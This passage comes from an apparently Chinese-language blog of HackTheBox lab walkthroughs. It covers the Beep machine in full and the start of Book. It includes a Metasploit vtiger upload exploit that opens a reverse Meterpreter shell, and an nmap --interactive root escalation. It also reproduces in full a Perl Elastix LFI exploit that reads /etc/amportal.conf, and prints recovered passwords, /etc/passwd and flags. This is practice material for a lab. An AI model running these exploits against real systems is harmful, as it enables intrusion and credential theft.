class="line">995&#x2F;tcp   open  pop3       Cyrus pop3d</span><br><span class="line">3306&#x2F;tcp  open  mysql      MySQL (unauthorized)</span><br><span class="line">4445&#x2F;tcp  open  upnotifyp?</span><br><span class="line">10000&#x2F;tcp open  http       MiniServ 1.570 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).</span><br><span class="line">Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m24s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Tue Apr  7 03:24:47 2020 -- 1 IP address (1 host up) scanned in 374.24 seconds</span><br></pre></td></tr></table></figure>
<p>SSL scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [4:37:19] C:127</span><br><span class="line">$ sslscan 10.10.10.7</span><br><span class="line">Version: 2.0.0-static</span><br><span class="line">OpenSSL 1.1.1f-dev  xx XXX xxxx</span><br><span class="line"></span><br><span class="line">Connected to 10.10.10.7</span><br><span class="line">Testing SSL server 10.10.10.7 on port 443 using SNI name 10.10.10.7                   </span><br><span class="line"></span><br><span class="line">  SSL&#x2F;TLS Protocols:</span><br><span class="line">SSLv2     disabled</span><br><span class="line">SSLv3     enabled</span><br><span class="line">TLSv1.0   enabled</span><br><span class="line">TLSv1.1   disabled </span><br><span class="line">TLSv1.2   disabled</span><br><span class="line">TLSv1.3   disabled                                                                   </span><br><span class="line"></span><br><span class="line">  TLS Fallback SCSV:</span><br><span class="line">Server does not support TLS Fallback SCSV</span><br><span class="line"></span><br><span class="line">  TLS renegotiation:</span><br><span class="line">Secure session renegotiation supported</span><br><span class="line"></span><br><span class="line">  TLS Compression:</span><br><span class="line">Compression enabled (CRIME)</span><br><span class="line"></span><br><span class="line">  Heartbleed:</span><br><span class="line">TLSv1.0 not vulnerable to heartbleed</span><br><span class="line"></span><br><span class="line">  Supported Server Cipher(s):</span><br><span class="line">Preferred TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  112 bits  DHE-RSA-DES-CBC3-SHA          DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  256 bits  AES256-SHA                    </span><br><span class="line">Accepted  TLSv1.0  128 bits  AES128-SHA                    </span><br><span class="line">Accepted  TLSv1.0  128 bits  RC4-SHA</span><br><span class="line"></span><br><span class="line">Accepted  TLSv1.0  112 bits  DES-CBC3-SHA                 </span><br><span class="line">Accepted  TLSv1.0  56 bits   TLS_RSA_WITH_DES_CBC_SHA     </span><br><span class="line">Accepted  TLSv1.0  56 bits   TLS_DHE_RSA_WITH_DES_CBC_SHA </span><br><span class="line"></span><br><span class="line">  Server Signature Algorithm(s):</span><br><span class="line">TLSv1.0  Server accepts all signature algorithms.</span><br><span class="line"></span><br><span class="line">  SSL Certificate:</span><br><span class="line">Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">RSA Key Strength:    1024</span><br><span class="line"></span><br><span class="line">Subject:  localhost.localdomain</span><br><span class="line">Issuer:   localhost.localdomain</span><br><span class="line"></span><br><span class="line">Not valid before: Apr  7 08:22:08 2017 GMT</span><br><span class="line">Not valid after:  Apr  7 08:22:08 2018 GMT</span><br></pre></td></tr></table></figure>
<p>wfuzz扫描目录</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407231110.png" alt=""></p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>寻找vtigercrm v5.1.0的漏洞</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407225540.png" alt=""></p>
<p>尝试``vtiger_php_exec<code>不行再换</code>vtiger_soap_upload`，可以反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_php_exec) &gt; use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description </span><br><span class="line">   ----       ---------------  --------  ----------- </span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL&#x2F;TLS for outgoing connections</span><br><span class="line">   TARGETURI  &#x2F;vtigercrm&#x2F;      yes       Base vTiger CRM directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   vTigerCRM v5.4.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RHOSTS 10.10.10.7</span><br><span class="line">RHOSTS &#x3D;&gt; 10.10.10.7</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RPORT 443</span><br><span class="line">RPORT &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set SSL true</span><br><span class="line">SSL &#x3D;&gt; true</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set LHOST 10.10.14.5</span><br><span class="line">LHOST &#x3D;&gt; 10.10.14.5</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; check</span><br><span class="line">[+] 10.10.10.7:443 - The target is vulnerable.</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:4444 </span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[+] Upload successfully uploaded</span><br><span class="line">[*] Executing payload...</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.7</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.5:4444 -&gt; 10.10.10.7:43989) at 2020-04-07 10:50:50 -0400</span><br><span class="line">[!] This exploit may require manual cleanup of &#39;bPRojImibS.php&#39; on the target</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">[+] Deleted bPRojImibS.php</span><br><span class="line">shell</span><br><span class="line">Process 8916 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)</span><br></pre></td></tr></table></figure>
<p>获取user flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;   </span><br><span class="line">sh-3.2$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)</span><br><span class="line">sh-3.2$ pwd</span><br><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;vtigercrm</span><br><span class="line">sh-3.2$ cd &#x2F;home&#x2F;fanis</span><br><span class="line">cd &#x2F;home&#x2F;fanis</span><br><span class="line">sh-3.2$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxrwxr-x 2 fanis fanis 4096 Apr  7  2017 .</span><br><span class="line">drwxr-xr-x 4 root  root  4096 Apr  7  2017 ..</span><br><span class="line">-rw------- 1 fanis fanis  114 Apr  7  2017 .bash_history</span><br><span class="line">-rw-r--r-- 1 fanis fanis   33 Apr  7  2017 .bash_logout</span><br><span class="line">-rw-r--r-- 1 fanis fanis  176 Apr  7  2017 .bash_profile</span><br><span class="line">-rw-r--r-- 1 fanis fanis  124 Apr  7  2017 .bashrc</span><br><span class="line">-rw-rw-r-- 1 fanis fanis   33 Apr  7  2017 user.txt</span><br><span class="line">sh-3.2$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">aeff3def0c765c2677b94715cffa73ac</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh-3.2$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for asterisk on this host:</span><br><span class="line">    env_reset, env_keep&#x3D;&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span><br><span class="line">    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE</span><br><span class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span><br><span class="line">    XAUTHORITY&quot;</span><br><span class="line"></span><br><span class="line">User asterisk may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;shutdown</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;yum</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;touch</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;chmod</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;chown</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;service</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;init</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postmap</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postfix</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;saslpasswd2</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;hardware_detector</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;chkconfig</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;elastix-helper</span><br></pre></td></tr></table></figure>
<p>命中<strong>Nmap</strong>，以root权限执行且无需认证</p>
<blockquote>
<p>较早版本的Nmap（2.02至5.21）具有交互模式，该模式允许用户执行Shell命令由于Nmap在以root特权执行的二进制文件列表中，因此可以使用交互式控制台来以相同的特权运行shell</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh-3.2$ sudo nmap --interactive</span><br><span class="line">sudo nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting Nmap V. 4.11 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line">sh-3.2# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">sh-3.2# cat &#x2F;root&#x2F;root.txt</span><br><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line">d88e006123842106982acce0aaf453f0</span><br></pre></td></tr></table></figure>
<h3 id="Another-Way">Another Way</h3>
<p>重点关注几个常见服务 22(ssh)、80(apache)、443(https)、3306(mysql)、10000(httpd)，访问 <code>https://10.10.10.7:443</code> ，返回登录页面：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407194104.png" style="zoom:67%;" />
<p>使用默认登录密码：<code>username: admin password: palosanto</code>，登录错误。</p>
<p>searchsploit找一下相关漏洞：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407195210.png" alt=""></p>
<p>尝试本地包含漏洞，因为靶机上的SSL证书过期了，所以要修改一下利用脚本：</p>
<blockquote>
<p><a href="https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate">https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate</a></p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------#Elastix is an Open Source Sofware to establish Unified Communications.               #About this concept, Elastix goal is to incorporate all the communication alternatives,                                                                         #available at an enterprise level, into a unique solution.                           #------------------------------------------------------------------------------------############################################################                         # Exploit Title: Elastix 2.2.0 LFI                                                   # Google Dork: :(                                                                     # Author: cheki                                                                       # Version:Elastix 2.2.0</span></span><br><span class="line"><span class="comment"># Tested on: multiple</span></span><br><span class="line"><span class="comment"># CVE : notyet</span></span><br><span class="line"><span class="comment"># romanc-_-eyes ;) </span></span><br><span class="line"><span class="comment"># Discovered by romanc-_-eyes</span></span><br><span class="line"><span class="comment"># vendor http://www.elastix.org/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t Elastix 2.2.0 LFI Exploit \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t code author cheki   \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t 0day Elastix 2.2.0  \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t email: anonymous17hacker&#123;&#125;gmail.com \n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> LWP::UserAgent;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n Target: https://ip &quot;</span>;</span><br><span class="line"><span class="keyword">chomp</span>(<span class="keyword">my</span> $target=&lt;STDIN&gt;);</span><br><span class="line">$dir=<span class="string">&quot;vtigercrm&quot;</span>;</span><br><span class="line">$poc=<span class="string">&quot;current_language&quot;</span>;</span><br><span class="line">$etc=<span class="string">&quot;etc&quot;</span>;</span><br><span class="line">$jump=<span class="string">&quot;../../../../../../../..//&quot;</span>;</span><br><span class="line">$test=<span class="string">&quot;amportal.conf%00&quot;</span>;</span><br><span class="line">$code = LWP::UserAgent-&gt;new() <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;inicializacia brauzeris\n&quot;</span>;</span><br><span class="line">$code-&gt;ssl_opts(<span class="string">verify_hostname =&gt;</span> <span class="number">0</span>, <span class="string">SSL_verify_mode =&gt;</span> <span class="number">0x00</span>);</span><br><span class="line">$code-&gt;agent(<span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#x27;</span>);</span><br><span class="line">$host = $target . <span class="string">&quot;/&quot;</span>.$dir.<span class="string">&quot;/graph.php?&quot;</span>.$poc.<span class="string">&quot;=&quot;</span>.$jump.<span class="string">&quot;&quot;</span>.$etc.<span class="string">&quot;/&quot;</span>.$test.<span class="string">&quot;&amp;module=Accounts&amp;action&quot;</span>;</span><br><span class="line">$res = $code-&gt;request(HTTP::Request-&gt;new(<span class="string">GET=&gt;</span>$host));</span><br><span class="line">$answer = $res-&gt;content; <span class="keyword">if</span> ($answer =~ <span class="string">&#x27;This file is part of FreePBX&#x27;</span>) &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n read amportal.conf file : $answer \n\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot; successful read\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n[-] not successful\n&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>从之前 sslscan 的扫描结果我们看到靶机只支持 TLSv1.0，因此我们需要修改 Kali 的openssl配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[system_default_sect]</span><br><span class="line">#MinProtocol &#x3D; TLSv1.2</span><br><span class="line">#CipherString &#x3D; DEFAULT@SECLEVEL&#x3D;2</span><br><span class="line"></span><br><span class="line">MinProtocol &#x3D; TLSv1.0</span><br><span class="line">CipherString &#x3D; DEFAUT</span><br></pre></td></tr></table></figure>
<p>再执行利用脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:15:57]</span><br><span class="line">$ perl 37637.pl &gt; elastix</span><br><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:16:34]</span><br><span class="line">$ cat elastix</span><br><span class="line">...</span><br><span class="line">AMPDBHOST&#x3D;localhost</span><br><span class="line">AMPDBENGINE&#x3D;mysql</span><br><span class="line"># AMPDBNAME&#x3D;asterisk</span><br><span class="line">AMPDBUSER&#x3D;asteriskuser</span><br><span class="line"># AMPDBPASS&#x3D;amp109</span><br><span class="line">AMPDBPASS&#x3D;jEhdIekWmdjE</span><br><span class="line">AMPENGINE&#x3D;asterisk</span><br><span class="line">AMPMGRUSER&#x3D;admin</span><br><span class="line">#AMPMGRPASS&#x3D;amp111</span><br><span class="line">AMPMGRPASS&#x3D;jEhdIekWmdjE</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>利用payload直接在网页上查看<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync</span><br><span class="line">shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown</span><br><span class="line">halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt</span><br><span class="line">mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:13:news:&#x2F;etc&#x2F;news:</span><br><span class="line">uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin</span><br><span class="line">games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin</span><br><span class="line">gopher:x:13:30:gopher:&#x2F;var&#x2F;gopher:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:99:99:Nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;bash</span><br><span class="line">distcache:x:94:94:Distcache:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:&#x2F;dev:&#x2F;sbin&#x2F;nologin</span><br><span class="line">pcap:x:77:77::&#x2F;var&#x2F;arpwatch:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cyrus:x:76:12:Cyrus IMAP Server:&#x2F;var&#x2F;lib&#x2F;imap:&#x2F;bin&#x2F;bash</span><br><span class="line">dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">apache:x:48:48:Apache:&#x2F;var&#x2F;www:&#x2F;sbin&#x2F;nologin</span><br><span class="line">mailman:x:41:41:GNU Mailing List Manager:&#x2F;usr&#x2F;lib&#x2F;mailman:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">postfix:x:89:89::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;sbin&#x2F;nologin</span><br><span class="line">asterisk:x:100:101:Asterisk VoIP PBX:&#x2F;var&#x2F;lib&#x2F;asterisk:&#x2F;bin&#x2F;bash</span><br><span class="line">rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">spamfilter:x:500:500::&#x2F;home&#x2F;spamfilter:&#x2F;bin&#x2F;bash</span><br><span class="line">haldaemon:x:68:68:HAL daemon:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">xfs:x:43:43:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">fanis:x:501:501::&#x2F;home&#x2F;fanis:&#x2F;bin&#x2F;bash</span><br><span class="line">Sorry! Attempt to access restricted file.</span><br></pre></td></tr></table></figure>
<p>使用<code>fanis : jEhdIekWmdjE</code>登录靶机发现密码错误，再一看Writeup，直接是可以root登录…orz==</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali @ kali <span class="keyword">in</span> ~/HackTheBox/Beep [9:19:31] </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ssh root@10.10.10.7</span></span><br><span class="line">root@10.10.10.7&#x27;s password: </span><br><span class="line">Last login: Tue Apr  7 16:20:42 2020 from 10.10.14.5</span><br><span class="line"></span><br><span class="line">Welcome to Elastix </span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">To access your Elastix System, using a separate workstation (PC/MAC/Linux)</span><br><span class="line">Open the Internet Browser using the following URL:</span><br><span class="line">http://10.10.10.7</span><br><span class="line"></span><br><span class="line">[root@beep ~]# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span><br><span class="line">[root@beep ~]# cat /root/root.txt </span><br><span class="line">d88e006123842106982acce0aaf453f0</span><br><span class="line">[root@beep ~]# cat /home/fanis/user.txt </span><br><span class="line">aeff3def0c765c2677b94715cffa73ac</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Book-walkthrough</title>
    <url>/Target_drone/HackTheBox/14.HTB-Book-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Book-Walkthrough">HTB::Book Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414142044.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>dirb</li>
<li>pspy</li>
<li>SQL  Truncate</li>
<li>XSS LFI</li>
<li>logrotate exp</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Apr  3 22:48:24 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.176</span><br><span class="line">Nmap scan report for 10.10.10.176</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)</span><br><span class="line">|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)</span><br><span class="line">|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   &#x2F;: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: LIBRARY - Read | Learn | Have Fun</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Apr  3 22:49:38 2020 -- 1 IP address (1 host up) scanned in 73.80 seconds</span><br></pre></td></tr></table></figure>
<p>路径扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ dirb http:&#x2F;&#x2F;10.10.10.176                                                           -----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------                                                                     </span><br><span class="line"></span><br><span class="line">START_TIME: Tue Apr 14 02:23:14 2020</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;10.10.10.176&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------                                                                     GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;10.10.10.176&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F;</span><br><span class="line"></span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.176&#x2F;index.php (CODE:200|SIZE:6800)</span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.176&#x2F;server-status (CODE:403|SIZE:277)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;index.php (CODE:200|SIZE:6291)</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F; ----</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F; ----</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F; ----</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F; ----</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Apr 14 04:45:39 2020</span><br><span class="line">DOWNLOADED: 32284 - FOUND: 4</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>查看80端口，有一个登录和注册页面，我们先正常注册和登录之后进站点看看，有三个点值得注意：</p>
<ul>
<li>Contact Us界面表明了有一个管理员账号<code>admin@book.htb</code></li>
<li>View Profile界面表明了现在账号的权限是<code>User</code></li>
<li>Collections界面有一个上传功能</li>
</ul>
<p>首先尝试能不能垂直越权，用<code>admin@book.htb</code>注册账号，Burp拦截请求</p>
